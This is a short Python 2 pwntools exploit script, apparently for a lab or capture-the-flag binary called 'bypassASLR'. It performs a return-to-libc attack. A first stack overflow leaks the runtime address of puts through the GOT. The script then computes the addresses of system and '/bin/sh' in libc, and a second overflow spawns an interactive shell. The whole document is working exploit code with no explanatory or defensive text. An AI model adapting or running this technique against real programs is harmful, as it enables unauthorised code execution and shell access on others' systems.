
from pwn import *


libc = ELF('libc.so')
elf = ELF('bypassASLR')

p = process('./bypassASLR')


plt_puts = elf.symbols['puts']
print 'plt_puts = ' + hex(plt_puts)

got_puts = elf.got['puts']
print 'got_puts = ' + hex(got_puts)


func_main = 0x080484ed
print 'func_main = ' + hex(func_main)

payload1 = 'a'*32 + p32(plt_puts) + p32(func_main) + p32(got_puts)

print "\nsending first payload ..."

p.sendline(payload1)

print "\nRecv leaked data.."
line = p.recvline()

adr =  u32(line[0x31:0x31+4])

print 'puts_addr=' + hex(adr)

system_addr = adr - (libc.symbols['puts'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)

binsh_addr = adr - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)


payload2 = 'a'* 24  + p32(system_addr) + p32(func_main) + p32(binsh_addr)
 
print "\nsending second payload ..."

p.sendline(payload2)
 
p.interactive()
